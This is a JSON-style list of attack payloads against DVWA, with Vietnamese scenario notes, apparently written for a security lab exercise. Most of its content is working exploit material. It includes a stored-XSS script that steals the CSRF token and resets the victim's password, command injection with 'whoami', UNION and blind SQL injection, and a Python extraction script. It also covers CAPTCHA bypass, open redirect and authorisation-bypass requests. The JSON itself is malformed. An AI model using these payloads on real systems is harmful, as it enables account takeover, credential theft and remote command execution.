[
  {
    "id": "A01",
    "vulnerability": "CSRF",
    "url": "/vulnerabilities/csrf/",
    "attack_scenario": "Trình duyệt nạn nhân đang đăng nhập DVWA. Lợi dụng trang web có lỗ hổng stored XSS, kẻ tấn công chèn payload vào trang web bị xss stored – khi nạn nhân mở trang đó, nạn nhân bị đánh cắp user_token và browser tự GET tới endpoint thay đổi mật khẩu, server cấp phát thành công vì không kiểm tra token.",
    "Xss_url": "/vulnerabilities/xss_s/",
    "method": "POST",
    "body" : "txtName=
                  fetch('/vulnerabilities/csrf/')
                  .then(response => response.text())
                  .then(html => {
                      const tokenRegex = /name='user_token' value='(.*?)' \/>/;
                      const match = html.match(tokenRegex);
                      if (match) {
                          const userToken = match[1];
                          const newPassword = 'password_bi_hack';
                          fetch(`/vulnerabilities/csrf/?password_new=${newPassword}&password_conf=${newPassword}&Change=Change&user_token=${userToken}`)
                      } else {
                          console.error('Không tìm thấy token');
                      }
                  });
                  &mtxMessage=1&btnSign=Sign Guestbook"
  },
  {
    "id": "A04",
    "vulnerability": "Insecure CAPTCHA",
    "url": "/vulnerabilities/captcha/",
    "attack_scenario": "Thay đổi password mà không cần xác thực captcha.",
    "method": "POST",
    "headers": {
      "User-Agent": "reCAPTCHA"
    },
    "body": "password_new=1&password_conf=1&g-recaptcha-response=hidd3n_valu3&Change=Change",
  },
  {
    "id": "A04",
    "vulnerability": "Open HTTP Redirect",
    "url": " /vulnerabilities/open_redirect/source/high.php",
    "attack_scenario": "Kẻ tấn công có thể lừa nạn nhân truy cập vào một URL độc hại mà không cần xác thực.",
    "method": "GET",
    "parameter": "?redirect=//github.com/LamChanKhai?id=info.php",
  },
  {
    "id": "A03",
    "vulnerability": "SQL Injection (Blind)",
    "url": "/vulnerabilities/sqli_blind/",
    "attack_scenario": "Gửi các payload SQL Injection error base ở cookie để lấy version của database.",
    "method": "GET",
    "cookie": "id=1' and (select case when (substring((select @@version),1,1)='1') then 'a' else 'b' end )= 'a' -- -; PHPSESSID=3685f4f741c10c019c5ab1492845bf8f; security=high",
    "automated_file": "
                        import requests
                        import string
                        import time
                        charset = string.digits + '.' + string.ascii_lowercase + string.ascii_uppercase + '_-'
                        url = 'http://127.0.0.1:4280/vulnerabilities/sqli_blind/'
                        version = ''
                        for i in range(100):
                            print('Finding character at position: ' + str(i))
                            for c in charset:
                                print('Testing character: ' + c)
                                injection = `1' and (select case when (substring((select @@version),` + str(i) + `,1)='` + c + `') then 'a' else 'b' end )= 'a' -- -`
                                cookie = {'security': 'high', 'PHPSESSID': '3685f4f741c10c019c5ab1492845bf8f', 'id': injection}
                                res = requests.get(url, cookies=cookie)
                                if 'User ID is MISSING from the database.' not in res.text:
                                    print('Found character: ' + c)
                                    version += c
                                    break
                            print('Current version: ' + version)"
    },
    {
    "id": "A04",
    "vulnerability": "Authorisation Bypass",
    "url": " /vulnerabilities/authbypass/change_user_details.php",
    "attack_scenario": "Kẻ tấn công truy cập thay đổi thông tin người dùng mà không cần quyền",
    "method": "POST",
    "body": "{"id":444,"first_name":"alice","surname":"alice"}",
    },
    {
    "id": "A03",
    "vulnerability": "Command Injection",
    "url": " /vulnerabilities/exec/",
    "attack_scenario": "Kẻ tấn công chèn mã hệ thống để RCE",
    "method": "POST",
    "body": "ip=|&|whoami&Submit=Submit",
    },
    {
    "id": "A03",
    "vulnerability": "SQL Injection",
    "url": "/vulnerabilities/sqli/",
    "attack_scenario": "Kẻ tấn công chèn mã truy vấn SQL để lấy danh sách user và password",
    "method": "POST",
    "body": "id= 1'union SELECT user,password from users; -- -&Submit=Submit",
    },
]

